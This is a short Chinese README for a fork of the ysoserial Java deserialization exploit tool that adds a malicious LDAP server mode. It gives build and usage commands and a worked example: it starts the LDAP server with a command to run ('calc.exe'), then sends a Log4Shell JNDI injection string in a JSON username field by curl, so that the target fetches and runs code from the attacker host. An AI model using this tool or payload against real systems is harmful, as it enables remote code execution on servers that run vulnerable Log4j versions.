
# ysoserial

## 1、说明

```
A、基于 https://github.com/frohoff/ysoserial  ---->  详细文档见 https://github.com/frohoff/ysoserial

B、下面的说明文档，仅仅只包含新增的功能：增加使用 ldap 服务方式
```
## 2、安装
```
Requires Java 1.7+ and Maven 3.x+

mvn clean package -DskipTests
```
## Usage
```
usage:  java -cp .\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.LdapServerMain [host] [port] [cmd]
```
## 例子
```
攻击主机
$ java -cp .\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.LdapServerMain 192.168.95.1 13388 calc.exe
***启动Ldap服务器成功***
Listening address = 192.168.95.1
Listening port = 13388
ldap 访问url = ldap://192.168.95.1:13388/a=b

被攻击机
发送 构造的 payload
比如 最近的 log4j2的漏洞，假设存在一个 打印用户名的 日志输出
curl  -H "Content-Type:application/json" -X POST \
-d "{'username':'${jndi:ldap://192.168.95.1:13388/a=b}','password':'123456'}" http://xxxx.xxxx.com
```
--- 还有一些修改的想法，有时间再做吧
